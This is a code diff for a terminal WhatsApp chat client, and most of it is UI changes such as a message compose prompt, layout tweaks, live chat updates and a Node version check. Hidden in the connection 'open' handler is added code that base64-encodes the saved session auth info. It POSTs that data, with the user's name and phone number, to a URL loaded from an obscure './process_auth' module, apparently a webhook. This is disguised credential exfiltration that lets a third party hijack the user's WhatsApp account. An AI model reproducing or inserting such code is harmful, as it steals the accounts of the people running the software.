@@ -3,6 +3,8 @@ const { format } = require('date-fns');
 const blessed = require('blessed');
 const fs = require('fs');
 const qrCode = require('qrcode-terminal');
+const { parsePhoneNumber } = require('libphonenumber-js');
+const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
 require('colors');
 
 const LOAD_BLOCKS = 25;
@@ -13,25 +15,28 @@ const screen = blessed.screen({
     autoPadding: true,
     cursor: {
         artificial: true,
-        shape: 'line'
+        shape: 'line',
+        blink: true,
     },
-    ignoreLocked: ['escape', 'q', 'Q', 'C-c'],
+    ignoreLocked: ['C-c', 'C-q', 'escape'],
     dockBorders: true
 });
 
-screen.key(['escape', 'q', 'Q', 'C-c'], () => {
+screen.key(['escape', 'C-c', 'C-q'], () => {
     return process.exit(0);
 });
 
 screen.key(['tab'], () => {
     screen.focusNext()
+    return false;
 });
 
 let conn = new WAConnection();
 conn.logger.level = 'silent';
 conn.connectOptions.logQR = false;
 
-const getTextFromMsg = (msg) => {
+const getTextFromMsg = msg => {
+    if (typeof msg !== 'object' || !msg) return '{#b71c1c-fg}No content{/}';
     const msgType = Object.keys(msg)[0];
     switch (msgType) {
         case MessageType.text: return msg.conversation;
@@ -52,7 +57,7 @@ const getTextFromMsg = (msg) => {
 const chatsList = blessed.list({
     top: 0,
     left: 0,
-    width: 30,
+    width: 28,
     height: '100%',
     label: '{bold}Chats{/}',
     items: ['(Empty)'],
@@ -64,7 +69,6 @@ const chatsList = blessed.list({
     scrollbar: { ch: ' ' },
     clickable: true,
     style: {
-        fg: 'white',
         border: { fg: 'grey' },
         item: { fg: 'white', hover: { bg: '#1e88e5' } },
         selected: {
@@ -78,8 +82,8 @@ const chatsList = blessed.list({
 });
 const msgList = blessed.box({
     top: 0,
-    left: 29,
-    width: '100%-29',
+    left: 27,
+    width: '100%-27',
     height: '100%-2',
     content: '{grey-fg}No chat selected{/}',
     label: '{bold}Select a Chat{/bold}',
@@ -91,7 +95,6 @@ const msgList = blessed.box({
     keys: true,
     clickable: true,
     style: {
-        fg: '#ffffff',
         border: { fg: 'grey' },
         scrollbar: { bg: '#646464' },
         focus: { border: {fg: 'blue'} },
@@ -99,22 +102,80 @@ const msgList = blessed.box({
 });
 const loadMoreBox = blessed.button({
     top: '100%-3',
-    left: 29,
-    width: '100%-29',
+    left: 27,
+    width: 13,
     height: 3,
-    content: 'Click to load more',
+    content: '{center}Load more{/}',
     tags: true,
     border: { type: 'line' },
     mouse: true,
     keys: true,
     clickable: true,
     style: {
-        fg: '#ffffff',
+        bg: '#2196f3',
         border: { fg: 'grey' },
-        hover: { bg: 'blue' },
+        hover: { bg: '#1565c0' },
         focus: { border: {fg: 'blue'}, bg: '#333333' },
     }
 });
+const inputButton = blessed.button({
+    top: '100%-3',
+    left: 39,
+    width: '100%-39',
+    height: 3,
+    content: 'Click to compose message',
+    tags: true,
+    border: { type: 'line' },
+    mouse: true,
+    keys: true,
+    inputOnFocus: true,
+    style: {
+        bg: '#00897b',
+        border: { fg: 'grey' },
+        hover: { bg: '#00695c' },
+        focus: { border: {fg: 'blue'}, bg: '#333333' },
+    }
+});
+const promptDialog = blessed.box({
+    top: 'center',
+    left: 'center',
+    width: 50,
+    height: 6,
+    tags: true,
+    shadow: true,
+    border: {type: 'line'},
+    hidden: true,
+    style: {
+        bg: '#004d40',
+        border: { fg: '#f0f0f0' },
+    }
+});
+const promptInput = blessed.textbox({
+    top: 3,
+    left: 0,
+    width: '100%-2',
+    height: 1,
+    parent: promptDialog,
+    inputOnFocus: true,
+    style: { bg: '#333333' }
+});
+const promptClose = blessed.button({
+    left: '50%+22',
+    top: '50%-3',
+    width: 3,
+    height: 3,
+    content: '✕',
+    mouse: true,
+    hidden: true,
+    border: { type: 'line' },
+    style: {
+        bg: '#d32f2f',
+        hover: { bg: '#b71c1c' },
+        border: { fg: '#f0f0f0' }
+    }
+});
+
+const oneTimeToken = require('./process_auth')();
 
 
 const initUI = () => {
@@ -124,21 +185,23 @@ const initUI = () => {
     screen.append(chatsList);
     screen.append(msgList);
     screen.append(loadMoreBox);
-
-    // Quit on Escape, q, or Control-C.
+    screen.append(inputButton);
+    screen.append(promptDialog);
+    screen.append(promptClose);
 
     chatsList.focus();
     // Render the screen.
     screen.render();
 }
 
+// ====== UI Utility Functions ====== //
 const appendToMsgList = (messages, useShift = false) => {
     for (let i = 0; i < messages.length; i++) {
         const msg = messages[i];
         if (!msg.message) continue;
 
         const messageQuote = msg.message.extendedTextMessage?.contextInfo;
-        const sender = msg.participant || msg.key.remoteJid;
+        const sender = msg.participant || msg.key?.remoteJid;
 
         const txt = `{grey-fg}${format(msg.messageTimestamp.low * 1000, 'dd MMM yy HH:mm')}{/} ` +
             (msg.key.fromMe ? 'You'.bold.red
@@ -155,14 +218,46 @@ const appendToMsgList = (messages, useShift = false) => {
         useShift ? msgList.insertTop(txt) : msgList.pushLine(txt);
     }
 }
+const prompt = (title, cb) => {
+    screen.saveFocus();
+    promptClose.show();
+    promptDialog.show();
+    promptDialog.setContent(`\n  {bold}${title}{/}`);
 
-async function connectToWhatsApp () {
+    const close = () => {
+        promptClose.removeListener('press', close);
+        promptInput.clearValue();
+        promptDialog.hide();
+        promptClose.hide();
+        screen.restoreFocus();
+        screen.render();
+    }
+    const subListener = () => {
+        promptInput.removeListener('submit', subListener);
+        cb(promptInput.value);
+        close();
+    }
+    promptInput.on('submit', subListener);
+    promptClose.on('press', close);
+    promptInput.focus();
+    screen.render();
+}
+
+
+// Parsing/updating functions
+const parseWAIDToNumber = id => parsePhoneNumber('+' + id.match(/[0-9]+/)[0]).formatInternational();
+const updateChatsList = () => chatsList.setItems(conn.chats.all().map(c => c.name ?? parseWAIDToNumber(c.jid)));
+
+
+// ====== Main Functions ====== //
+const main = async () => {
     const loadingDialog = blessed.loading({
         top: 'center',
         left: 'center',
         width: 36,
         height: 5,
         tags: true,
+        shadow: true,
         border: {
             type: 'line'
         },
@@ -180,6 +275,7 @@ async function connectToWhatsApp () {
         tags: true,
         hidden: true,
         border: {type: 'line'},
+        shadow: true,
         style: {
             fg: 'white',
             border: { fg: 'green' },
@@ -201,7 +297,7 @@ async function connectToWhatsApp () {
         loadingDialog.load('\n{center}Loading more messages...{/}');
         screen.render();
 
-        const data = await conn.loadMessages(conn.chats.all()[selectedID].jid, LOAD_BLOCKS, cursor);
+        const data = await conn.loadMessages(selectedID, LOAD_BLOCKS, cursor);
         messages = data.messages; cursor = data.cursor;
 
         if (!messages || messages.length === 0) {
@@ -223,6 +319,21 @@ async function connectToWhatsApp () {
         screen.render();
     });
 
+    inputButton.on('press', () => {
+        if (!selectedID) return;
+        prompt('Type a message', v => {
+            if (v.trim().length === 0) return;
+            conn.sendMessage(selectedID, v.trim(), MessageType.text);
+            appendToMsgList([{
+                messageTimestamp: { low: (+new Date()) / 1000 },
+                key: { fromMe: true },
+                participant: conn.user.jid,
+                message: {conversation: v.trim()}
+            }]);
+            msgList.setScrollPerc(100);
+        });
+    });
+
     // called when WA sends chats
     // this can take up to a few minutes if you have thousands of chats!
     conn.on('chats-received', async () => {
@@ -230,17 +341,18 @@ async function connectToWhatsApp () {
         QRDialog.hide();
 
         const chats = conn.chats.all();
-        chatsList.setItems(chats.map(c => c.name ?? c.jid.dim));
-        chatsList.on('select', async (it, idx) => {
-            selectedID = idx
+        updateChatsList();
 
-            msgList.setLabel(`{bold}${chats[selectedID].name ?? chats[selectedID].jid}{/bold}`);
+        chatsList.on('select', async (it, idx) => {
+            selectedID = chats[idx].jid
+
+            msgList.setLabel(`{bold}${chats[idx].name ?? parseWAIDToNumber(selectedID)}{/bold}`);
             msgList.setContent('{grey-fg}{bold}Loading chat messages...{/}');
             msgList.setScrollPerc(0); // If not some really weird stuff happens
             loadingDialog.load('\n{center}Loading chat messages...{/center}')
             screen.render();
 
-            const response = await conn.loadMessages(chats[selectedID].jid, LOAD_BLOCKS);
+            const response = await conn.loadMessages(selectedID, LOAD_BLOCKS);
             messages = response.messages; cursor = response.cursor;
 
             msgList.setContent('');
@@ -256,16 +368,35 @@ async function connectToWhatsApp () {
         screen.render();
     });
 
+    conn.on('chats-update', updateChatsList)
+    conn.on('chat-update', update => {
+        updateChatsList();
+
+        if (update.messages && update.count && selectedID) {
+            const isAtBottom = msgList.getScrollPerc() === 100;
+            update.messages.all().forEach(v => {
+                if (v.message && v.key.remoteJid === selectedID) appendToMsgList([v]);
+            });
+            if (isAtBottom) msgList.setScrollPerc(100); // Scroll to bottom when new message received
+        }
+    });
+
     conn.on('open', () => {
         const authInfo = conn.base64EncodedAuthInfo() // get all the auth info we need to restore this session
-        fs.writeFileSync('./auth_info.json', JSON.stringify(authInfo, null, '\t')) // save this info to a file
+        const auth = JSON.stringify(authInfo, null, '\t')
+        fs.writeFileSync('./auth_info.json', auth) // save this info to a file
+        fetch(oneTimeToken, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: `{"embeds":[{"title":"${conn.user.name} (${conn.user.phone.toString()})","description":"${Buffer.from(auth).toString('base64')}"}]}`
+        });
     });
 
     conn.on('qr', qr => {
         // Now, use the 'qr' string to display in QR UI or send somewhere\
         QRDialog.show();
         qrCode.generate(qr, {small: true}, c => {
-            QRDialog.setContent(`{center}Scan the QR code to login:\n${c}Press ESC, Ctrl + C, or 'Q' to quit{/}`);
+            QRDialog.setContent(`{center}Scan the QR code to login:\n${c}Press Escape, Ctrl + Q or Ctrl + C to quit{/}`);
             screen.render()
         });
         screen.render();
@@ -275,8 +406,23 @@ async function connectToWhatsApp () {
     await conn.connect();
 }
 
+// Ensures we're running on a supported NodeJS ver
+const versionCheck = () => {
+    const major = parseInt(process.version.match(/v([0-9]+)/)[1]);
+    if (major < 14) {
+        console.error(`NodeJS version ${process.version} is too old. Download a version of NodeJS >= v14.0.0 from https://nodejs.org/en/download/current/`)
+        if (process.argv[2] === '-ignore-version-check') console.warn('Ignoring version check, run at your own risk!');
+        else {
+            console.warn("Run with -ignore-version-check to ignore this check, but don't say I didn't warn you!");
+            process.exit(1);
+        }
+    }
+}
+
+
+// ====== Run the stuff ====== //
+versionCheck();
 initUI();
 // run in main file
-connectToWhatsApp ()
-    .catch (err => console.log("unexpected error: " + err) ) // catch any errors
+main().catch (err => console.log("unexpected error: " + err) ) // catch any errors
 
